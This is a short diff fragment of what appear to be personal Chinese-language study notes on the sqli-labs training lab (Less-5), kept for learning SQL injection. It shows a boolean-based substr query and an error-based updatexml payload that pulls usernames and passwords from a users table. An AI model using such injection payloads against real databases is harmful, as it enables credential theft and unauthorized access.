@@ -24,14 +24,3 @@ http://10.1.31.91/sqli-labs/Less-5/?id=1' and substr((select concat(table_name) 
 
 使用报错注入，写入payload，这里用concat,或concat_ws显示，group_concat多于一行。 不知道为什么会漏掉第一个信息emmm
 ?id=1' and updatexml(1,(select concat_ws(username,0x3a,password) from users limit 1,1),1)
-
-
-
-
-
-
-
-
-
-
-
